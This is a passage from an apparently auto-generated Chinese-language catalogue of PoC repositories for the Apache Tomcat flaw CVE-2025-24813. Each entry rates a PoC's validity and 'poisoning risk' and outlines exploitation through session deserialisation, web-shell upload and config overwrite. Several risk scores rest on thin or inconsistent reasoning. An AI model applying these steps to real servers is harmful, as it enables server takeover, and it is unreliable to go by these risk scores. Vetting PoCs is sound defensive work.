**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #29

**来源**: [CVE-2025-24813-fatkz_CVE-2025-24813.md](../2025/CVE-2025-24813-fatkz_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下所有条件：DefaultServlet的writes启用（readonly=false）；支持partial PUT（默认启用）；使用Tomcat的文件session持久化机制，且为默认存储位置；应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个远程代码执行漏洞，该漏洞源于对包含恶意 Java 序列化对象的`.session`文件的处理不当。攻击者可以通过发送带有 `Content-Range` 头的 partial PUT 请求，将恶意`.session`文件上传到 `work/` 目录。当具有匹配 `JSESSIONID` cookie 的请求到达时，Tomcat 会自动反序列化该恶意 session，从而导致任意代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的 POC 代码，该漏洞的 POC 代码是有效的。多个来源都表明该漏洞已被积极利用。

**利用方式：**
1.  **准备恶意 Payload:** 使用 `ysoserial` 或类似工具生成包含恶意代码的序列化 Java 对象，并将其保存为 `.ser` 文件。
2.  **上传 Payload:** 使用 partial PUT 请求将恶意 `.ser` 文件上传到 Tomcat 的 `work/` 目录下，文件名为 `<session_id>.session`。`Content-Range` 头用于模拟不完整的上传。
3.  **触发反序列化:**  发送包含与上传的 session 文件名相匹配的 `JSESSIONID` cookie 的 HTTP 请求到目标 Tomcat 服务器，这会导致 Tomcat 反序列化上传的恶意 session 文件，从而执行恶意代码。

**投毒风险：**
POC 代码本身看起来相对简单，主要执行上传 payload 和触发反序列化操作。仔细检查后，存在以下潜在的投毒风险：

*   **Payload 内容：** 虽然 POC 代码没有直接包含恶意 payload，但是依赖用户提供的 `payload_file`。如果用户从不可信的来源获取了恶意 payload 文件，则可能存在投毒风险。
*   **隐蔽的 HTTP 请求修改：** 在 `requests.put` 或 `requests.get` 调用中，攻击者可能添加额外的 HTTP 头或修改请求内容，以在目标服务器上执行其他恶意操作。目前的代码较为简洁，未发现明显的可疑之处。
*   **依赖库的风险：** `requests` 是一个常用的 Python 库，但如果攻击者篡改了这个库，可能会引入恶意行为。可能性较低，但不能完全排除。
*   **代码逻辑的细微修改：** 攻击者可能会对 POC 代码进行细微修改，例如更改上传路径或触发反序列化的方式，以便在特定环境下实现更隐蔽的攻击。这些修改后的代码可能更难被检测到。

总体而言，此 POC 代码直接包含投毒代码的可能性较低，约 10%。更大的风险在于用户使用的 payload 文件是否可信，以及攻击者是否会对代码进行修改以适应特定环境。


**项目地址:** [fatkz/CVE-2025-24813](https://github.com/fatkz/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #30

**来源**: [CVE-2025-24813-gregk4sec_CVE-2025-24813.md](../2025/CVE-2025-24813-gregk4sec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和文件篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2
10.1.0-M1 <= version <= 10.1.34
9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：Default Servlet 开启写入权限 (默认关闭), 开启 partial PUT (默认开启), 敏感文件位于公开上传目录的子目录, 攻击者已知敏感文件名, 使用 partial PUT 上传敏感文件，或者Tomcat使用文件存储 session 且包含可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，攻击者可以通过利用 'file.Name' (内部点) 绕过路径检查，结合 Default Servlet 的写入权限和 partial PUT 功能，实现远程代码执行、信息泄露或恶意内容添加。

**漏洞利用方式分析:**

1.  **信息泄露和文件篡改:**
    *   攻击者利用 partial PUT 功能，将恶意内容写入服务器上的临时文件。
    *   利用路径等价漏洞，使得攻击者可以访问或覆盖位于受保护目录中的文件。
    *   通过精心构造的 partial PUT 请求，攻击者可以读取或修改敏感文件，导致信息泄露或文件篡改。
    *   PoC 代码演示了如何通过 partial PUT 请求，在未授权的情况下读取 secret 目录下的文件内容，实现信息泄露。

2.  **远程代码执行 (RCE):**
    *   如果 Tomcat 使用文件存储 session，攻击者可以将包含恶意序列化对象的 payload 上传到 session 文件中。
    *   当 Tomcat 加载该 session 时，会触发反序列化漏洞，导致远程代码执行。

**投毒风险分析:**

PoC 代码存在很高的投毒风险，原因如下：

1.  **利用条件复杂:** 该漏洞的利用依赖于多个配置条件，例如 Default Servlet 开启写入权限，开启 partial PUT，以及特定的目录结构。攻击者可能需要进行大量的探测和尝试才能找到满足利用条件的目标。
2.  **文件上传:** 该漏洞涉及到文件上传，攻击者可以在上传的文件中嵌入恶意代码，例如 webshell 或其他恶意脚本，从而控制服务器。
3. **Partial PUT 特点:**  Partial PUT 允许攻击者分块上传文件,方便投毒和绕过检查。
4.  **反序列化攻击:** RCE的其中一种方式依赖反序列化漏洞，而反序列化 payload 本身就具有极高的投毒风险。

考虑到这些因素，该漏洞的投毒风险非常高。如果攻击者成功利用该漏洞，可能会对服务器造成严重的损害。

**项目地址:** [gregk4sec/CVE-2025-24813](https://github.com/gregk4sec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #31

**来源**: [CVE-2025-24813-hakankarabacak_CVE-2025-24813.md](../2025/CVE-2025-24813-hakankarabacak_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet的写入已启用；支持Partial PUT；应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置；应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，涉及路径等价问题和潜在的反序列化远程代码执行。根据漏洞库信息，如果满足以下条件，攻击者能够执行远程代码：

*   默认Servlet的写入已启用（默认禁用）。
*   支持Partial PUT（默认启用）。
*   应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置。
*   应用程序包含一个可能在反序列化攻击中被利用的库。

根据搜索引擎结果，该漏洞已被积极利用。

提供的 Dockerfile 漏洞利用代码显示：

1.  **开启了`readonly`参数**: 将`readonly`参数设置为`false`，从而启用了默认Servlet的写入功能，这是利用该漏洞的必要条件之一。
2.  **配置了`PersistentManager`**: 添加了 `<Manager className="org.apache.catalina.session.PersistentManager"><Store className="org.apache.catalina.session.FileStore"/></Manager>` 配置，启用了基于文件的会话持久性，这也是 RCE 的条件之一
3.  **部署WAR包**: 将 ROOT.war 部署到 webapps 目录下。这个WAR包很可能包含恶意代码，通过文件上传或者会话反序列化漏洞被执行。

**利用方式：**

该漏洞的利用方式主要依赖于 Partial PUT 功能和路径等价性。攻击者可以利用 Partial PUT 上传恶意文件片段，然后利用路径等价性（例如使用 `file.Name`）绕过安全检查，将恶意代码写入到目标文件或利用反序列化执行任意代码。 如果使用了 session 持久化，且存在可利用的反序列化 gadget，那么可以利用该漏洞进行RCE。

**投毒风险：**

Dockerfile 本身并未直接包含恶意代码，而是通过配置使 Tomcat 处于易受攻击的状态，并部署一个外部 WAR 包（`ROOT.war`）。因此，投毒的风险主要在于 `ROOT.war` 包中是否包含后门或者恶意代码。 风险评估为 10%,主要原因为需要进一步分析war包，才能确认。

**有效性：**

Dockerfile 配置如果部署了恶意war包，则可以证明该POC有效。在满足了所有漏洞利用条件的情况下，该代码可以有效利用 CVE-2025-24813 漏洞，实现远程代码执行。

**项目地址:** [hakankarabacak/CVE-2025-24813](https://github.com/hakankarabacak/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #32

**来源**: [CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md](../2025/CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 存在安全敏感上传的目标URL，该URL是公共上传目标URL的子目录。
  4. 攻击者知道要上传的安全敏感文件的名称。
  5. 安全敏感文件也通过部分PUT上传。
或者，如果满足以下条件，则恶意用户可以执行远程代码执行：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 应用程序正在使用Tomcat的基于文件的会话持久性，并使用默认存储位置。
  4. 应用程序包含一个可以在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合默认Servlet的写入启用和部分PUT支持，攻击者可以通过构造特殊的上传路径，覆盖或修改服务器上的敏感文件，造成信息泄露或恶意代码执行。该漏洞还涉及反序列化利用链，如果应用程序满足特定条件，攻击者可以利用Tomcat的文件会话管理机制和应用程序中的反序列化漏洞来执行任意代码。

**有效性分析：**

提供的PoC代码通过检查以下几点来验证漏洞的有效性：

1.  **PUT方法允许性：** 检查目标URL是否允许PUT请求，这是利用该漏洞的前提。
2.  **Tomcat版本检测：** 检查目标服务器的Tomcat版本，确认其是否在受影响的范围内。
3.  **写入权限检查：** 尝试在目标URL的/uploads/目录下写入一个JSP文件，以验证是否具有写入权限。

如果以上三个条件都满足，则目标服务器可能存在CVE-2025-24813漏洞。

**投毒风险分析：**

检查了提供的Python脚本，发现它主要用于检测目标服务器是否存在CVE-2025-24813漏洞，脚本尝试上传JSP文件以验证写入权限。因此，存在很小的投毒风险，代码的功能主要是检测和验证漏洞，而非利用漏洞执行恶意操作，上传的JSP payload也是用于验证，而不是直接执行恶意代码. 但是依然存在服务器被动植入后门webshell的风险。

**利用方式：**

根据漏洞描述，利用方式主要包括以下两种：

1.  **信息泄露/文件篡改：**

   *   攻击者通过构造包含`.Name`（内部点）的恶意文件名，利用路径等价性绕过安全检查。
   *   利用部分PUT请求，将恶意内容注入到安全敏感文件中，或者直接覆盖文件。
   *   目标URL需要是公共上传URL的子目录，且攻击者需要知道敏感文件名。

2.  **远程代码执行：**

   *   攻击者需要找到应用程序中可利用的反序列化漏洞。
   *   利用Tomcat的文件会话管理，将包含恶意反序列化payload的文件上传到会话存储目录。
   *   当Tomcat加载会话数据时，触发反序列化，执行任意代码。

成功利用此漏洞需要满足多个条件，包括Tomcat配置、应用程序环境以及攻击者的知识。

**项目地址:** [horsehacks/CVE-2025-24813-checker](https://github.com/horsehacks/CVE-2025-24813-checker)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #33

**来源**: [CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 ~ 11.0.2, 10.1.0-M1 ~ 10.1.34, 9.0.0.M1 ~ 9.0.98

**利用条件:** 默认Servlet写入已启用，支持部分PUT已启用，目标URL是公共上传URL的子目录, 攻击者需要知道上传的安全敏感文件的名称，安全敏感文件也通过部分PUT上传；或者应用程序使用 Tomcat 基于文件的会话持久性，默认存储位置，应用程序包含一个可以在反序列化攻击中使用的库

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 涉及 Apache Tomcat 的路径等价问题，可能导致远程代码执行、信息泄露或恶意内容注入。漏洞利用依赖于多个条件，包括默认Servlet写入已启用，支持部分PUT请求，以及特定的文件存储配置。搜索结果 "One PUT Request to Own Tomcat: CVE-2025-24813 RCE is in the Wild/" 表明该漏洞可能已在野外被利用，提高了其风险级别。提供的PoC代码是一个批量检测脚本，通过发送恶意PUT请求来验证目标是否存在漏洞。由于PoC中包含未经审查的base64解码payload, 存在极高的投毒风险，攻击者可能修改payload指向恶意地址，执行任意代码,因此投毒风险为100%。

**利用方式：**
1.  **信息泄露/恶意内容注入：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT，则可以查看安全敏感文件和/或将内容注入到这些文件中。
2.  **远程代码执行：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack，则可利用反序列化漏洞执行远程代码。
3.  **PoC 利用：** PoC脚本首先解析目标URL，然后发送精心构造的PUT请求到目标服务器。如果服务器存在漏洞，并且满足利用条件，攻击者可以实现远程代码执行或信息泄露。

**项目地址:** [iSee857/CVE-2025-24813-PoC](https://github.com/iSee857/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #34

**来源**: [CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md](../2025/CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露以及服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要 writes enabled for the default servlet (默认禁用), support for partial PUT (默认启用), application 使用 Tomcat 的基于文件的 session 持久化，默认存储位置, application 包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。攻击者可以利用此漏洞绕过安全限制，通过精心设计的目录遍历序列覆盖关键配置文件，部署 web shell，并可能实现远程代码执行 (RCE)。

**有效性：**
提供的 Nuclei 模板（CVE-2025-24813.yaml）似乎有效。它包含三个请求：
1.  **PUT 请求覆盖 tomcat-users.xml：** 用于创建一个新的管理员用户，从而允许未经授权的访问。
2.  **PUT 请求部署 JSP Web Shell：** 用于在服务器上部署一个简单的 Web Shell，允许执行任意命令。
3.  **GET 请求执行 `id` 命令：**  用于验证 Web Shell 是否已成功部署并且可以执行命令。

该模板使用匹配器来验证请求是否成功，并提取相关信息。`README.md` 文件还提供了关于如何使用该模板和执行 Web Shell 的说明。

**投毒风险：**
虽然 POC 代码本身的目的在于利用漏洞，但其中潜在的投毒风险较低（约 5%）。风险主要存在于以下几个方面：
1.  **Web Shell 功能：** Web Shell 允许执行任意命令，如果攻击者在测试环境之外使用它，可能会造成恶意行为。虽然提供的 Web Shell 相对简单，但攻击者可以修改它以包含恶意功能，例如下载和执行其他恶意软件。
2.  **配置文件覆盖：** 覆盖 `tomcat-users.xml` 文件虽然是利用漏洞的一部分，但如果攻击者使用恶意配置替换该文件，可能会导致服务器不稳定或更容易受到其他攻击。
3.  **第三方依赖：** Nuclei 模板本身依赖于 Nuclei 工具。如果 Nuclei 工具被篡改，则可能存在其他风险。

总体而言，直接投毒的风险较低，因为代码主要集中在利用已知漏洞上。然而，通过 Web Shell 执行恶意操作的可能性仍然存在。

**利用方式：**
利用 CVE-2025-24813 漏洞的步骤如下：
1.  **利用路径等价漏洞：** 攻击者利用 Tomcat 默认 servlet 处理文件上传时存在的路径等价漏洞。通过在文件名中使用 ".." 序列，攻击者可以绕过目录限制，将文件上传到 Tomcat 配置目录或 Web 应用程序的根目录。
2.  **覆盖 `tomcat-users.xml` 文件：** 攻击者使用 PUT 请求将包含恶意用户的 `tomcat-users.xml` 文件上传到 `../conf/` 目录。此文件覆盖现有的 `tomcat-users.xml` 文件，从而创建一个具有管理员权限的新用户。
3.  **部署 Web Shell：** 攻击者使用 PUT 请求将 JSP Web Shell 文件上传到 Web 应用程序的根目录（`../webapps/ROOT/`）。此 Web Shell 允许攻击者在服务器上执行任意命令。
4.  **执行任意命令：** 攻击者使用浏览器访问 Web Shell 的 URL，并通过 `cmd` 参数执行任意命令。例如，`http://target.com/updates.jsp?cmd=id` 命令将显示服务器的用户 ID 信息。

**需要注意的是，默认情况下，Tomcat 的 default servlet 的写入是禁用的，需要手动启用。** 除此之外，如果启用了基于文件的 session 持久化，并且应用包含了可用于反序列化攻击的库，则可以通过上传恶意的 session 文件来实现 RCE。

攻击者可以通过上传恶意文件，执行任意代码，并完全控制受影响的 Tomcat 服务器。

**项目地址:** [imbas007/CVE-2025-24813-apache-tomcat](https://github.com/imbas007/CVE-2025-24813-apache-tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #35

**来源**: [CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 to 9.0.98, 10.1.0-M1 to 10.1.34, 11.0.0-M1 to 11.0.2

**利用条件:** 需要满足多个条件，包括：默认Servlet的写入启用（默认禁用），支持partial PUT（默认启用），特定的目录结构，攻击者需要了解敏感文件名，应用使用Tomcat的文件会话持久性（默认位置）并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个高危漏洞，涉及路径等价性（内部点）问题，可能导致远程代码执行（RCE）、信息泄露或恶意内容添加到上传的文件。该漏洞利用了Tomcat对包含内部点的文件名处理不当，结合启用的Default Servlet写入功能和Partial PUT支持。如果攻击者能够满足所有前提条件，则可以上传恶意JSP文件或通过反序列化漏洞执行任意代码。从github仓库提供的python脚本来看，该脚本只是检测是否存在漏洞，并不能实现真正的利用。该仓库存在一定的投毒风险，可能性为10%， 主要体现在作者可能在后续版本中添加恶意代码，例如反弹shell或植入后门等，但当前提供的版本并未发现明显的恶意行为。

**项目地址:** [issamjr/CVE-2025-24813-Scanner](https://github.com/issamjr/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #36

**来源**: [CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md](../2025/CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** Default Servlet 开启写入 (默认关闭), 支持Partial PUT (默认开启), 应用使用Tomcat的文件Session持久化存储(默认位置), 存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个高危漏洞，源于路径等价（Path Equivalence）问题和不安全的反序列化。

**漏洞利用方式：**

1.  **路径等价和信息泄露/恶意内容注入：** 如果 Tomcat 启用了 Default Servlet 的写入功能（`writes enabled for the default servlet`），并支持 partial PUT（`support for partial PUT`），且存在一个安全敏感文件上传的目标 URL 是公共上传 URL 的子目录，攻击者知晓敏感文件名，并使用 partial PUT 上传，则攻击者可能能够查看敏感文件或向其中注入恶意内容。
2.  **反序列化导致远程代码执行：** 如果 Tomcat 启用了 Default Servlet 的写入功能，支持 partial PUT，且应用程序使用了 Tomcat 的基于文件 Session 持久化存储（使用默认存储位置），并且应用程序包含一个可以用于反序列化攻击的库，那么攻击者可能执行远程代码。

**POC 有效性：**

提供的 POC 代码 `poc-cve.py`  是一个 Python 脚本，用于检测和利用 CVE-2025-24813 漏洞。它包含以下功能：

*   检测 Default Servlet 是否可写（通过 PUT 方法）。
*   生成 ysoserial payload 用于反序列化攻击。
*   通过 PUT 方法上传恶意 payload 到 session 文件，从而触发反序列化漏洞。

根据漏洞信息和 POC 代码，此 POC 具备有效性，可以在满足漏洞利用条件的环境中实现远程代码执行。

**投毒风险分析：**

仔细检查了提供的 Python 脚本 `poc-cve.py` 和 `README.md`。代码主要用于生成和上传恶意 payload，利用反序列化漏洞执行命令。以下是风险评估：

*   **高风险部分**  使用了 `ysoserial.jar`，如果下载源被篡改，可能会引入恶意代码。但脚本本身只是调用 `ysoserial.jar`，并没有直接包含恶意逻辑。
*   **潜在风险** 脚本在生成 payload 过程中，如果 `ysoserial.jar`  被替换为恶意版本，或者脚本中的命令注入点被恶意修改，可能导致投毒。
*   **低风险部分**  脚本中包含删除临时文件的函数 `remove_file`，这有助于清理攻击痕迹，本身不属于投毒行为。

综合评估，该仓库存在一定的投毒风险，主要集中在 ysoserial 的依赖和命令注入的可能性上。考虑到代码的整体结构和目的，以及作者声明的教育目的，直接包含恶意代码的可能性较低。风险评估百分比为10%。主要是考虑到使用者可能会误用或在不安全的环境中使用。

**总结：**

CVE-2025-24813 是一个需要多种条件才能触发的漏洞。 POC 实现了漏洞利用，但存在一定的投毒风险，主要是依赖外部工具 `ysoserial` 且需要谨慎使用。


**项目地址:** [maliqto/PoC-CVE-2025-24813](https://github.com/maliqto/PoC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #37

**来源**: [CVE-2025-24813-manjula-aw_CVE-2025-24813.md](../2025/CVE-2025-24813-manjula-aw_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和文件篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了DefaultServlet的写入功能（默认禁用）；2. 启用了partial PUT支持（默认启用）；3. 对于RCE，需要应用程序使用Tomcat基于文件的会话持久化，并且包含可用于反序列化攻击的库；对于信息泄露和文件篡改，攻击目标URL是公共上传URL的子目录，且攻击者知道要上传的敏感文件名称,并且敏感文件也通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，利用 'file.Name' (Internal Dot) 导致远程代码执行（RCE）和/或信息泄露和/或通过写入启用的 Default Servlet 将恶意内容添加到上传的文件中。根据漏洞描述和搜索结果，此漏洞利用需要特定配置才能成功。利用方式涉及通过 partial PUT 请求上传恶意构造的文件。提供的POC代码包含三个主要脚本：`01-prepare-environment.sh` 用于配置Tomcat环境，包括启用 DefaultServlet 的写入功能、配置会话持久化（RCE所需），以及下载必要的依赖（ysoserial和commons-collections）；`03-test.sh` 用于构造和发送包含恶意payload的PUT请求，使用ysoserial生成payload，利用CommonsCollections5链执行命令 `touch /tmp/pwndtomcat`。漏洞利用的关键在于 `Content-Range` 头部，该头部用于执行 partial PUT 请求，从而允许攻击者利用路径等价漏洞。该脚本通过修改Content-Range头部中的长度字段，来绕过一些安全检查，实现恶意payload的上传和执行。

**有效性：** 提供的POC代码有效，如果目标环境满足漏洞利用的先决条件（启用了DefaultServlet的写入功能，支持partial PUT，以及特定的部署配置），则可以成功利用该漏洞进行RCE或文件篡改/信息泄露。

**投毒风险：** 经过对POC代码的分析，未发现明显的投毒代码。该POC的目的是重现和利用CVE-2025-24813漏洞。脚本的行为符合漏洞利用的预期步骤，没有发现作者隐藏的恶意行为。所有操作都与漏洞利用直接相关。因此，投毒风险评估为0%。

**利用方式：**
1.  **环境准备：** 使用 `01-prepare-environment.sh` 脚本配置Tomcat环境，使其满足漏洞利用的先决条件（例如，启用写入的DefaultServlet，配置基于文件的会话管理）。
2.  **Payload生成：** 使用 `ysoserial` 工具生成恶意序列化 payload。  该 payload 会在目标服务器上执行任意命令。
3.  **Partial PUT 请求：**  使用 `03-test.sh` 脚本，通过精心构造的带有 `Content-Range` 头的 HTTP PUT 请求将 payload 发送到 Tomcat 服务器。 `Content-Range` 头的构造是利用漏洞的关键步骤。 
4.  **RCE/信息泄露/文件篡改：**  如果一切顺利，Tomcat 服务器会反序列化恶意 payload，导致在服务器上执行任意代码（RCE）或修改服务器上的文件，导致信息泄露或文件篡改。

**项目地址:** [manjula-aw/CVE-2025-24813](https://github.com/manjula-aw/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #38

**来源**: [CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md](../2025/CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md)

## CVE-2025-24813-Apache Tomcat-RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可完全控制服务器

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 默认Servlet开启写入(disabled by default), 支持Partial PUT(默认开启), 使用Tomcat文件Session持久化默认位置，应用包含可用于反序列化的库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过构造包含内部点（例如 file.Name）的文件名，结合启用的默认Servlet写入和部分PUT支持，可能导致远程代码执行和/或信息泄露。POC利用方式如下：

1.  **检查先决条件：** 检查目标Tomcat实例是否满足利用条件：默认Servlet的写入是否开启，Partial PUT是否支持（默认开启），是否使用了基于文件的Session持久化，以及是否包含可利用的反序列化库。
2.  **构造恶意Payload：** 使用 ysoserial 工具生成恶意的序列化 Java Payload，该 Payload 包含要执行的命令。
3.  **上传Payload：** 通过 PUT 请求将Payload上传到Tomcat服务器的Session存储目录。利用路径遍历(../)绕过上传限制，将恶意Session文件上传到 `uploads/../sessions/` 目录下.
4.  **触发反序列化：**  向服务器发送包含特定Session ID的请求，触发Tomcat加载恶意的Session文件，导致反序列化漏洞被触发，执行Payload中的命令。
5. **验证和清理：** 验证命令是否成功执行，并清理上传的恶意Session文件。

**有效性评估：**
根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用。

**投毒风险评估：**
仔细分析了提供的POC代码，没有发现作者有意隐藏的投毒代码。代码逻辑清晰，功能明确，主要是利用ysoserial生成payload，然后通过PUT请求上传，最后触发。



**项目地址:** [mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-](https://github.com/mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #39

**来源**: [CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md](../2025/CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价 / 反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 对于RCE：Default Servlet 开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。对于信息泄露/内容注入：Default Servlet 开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

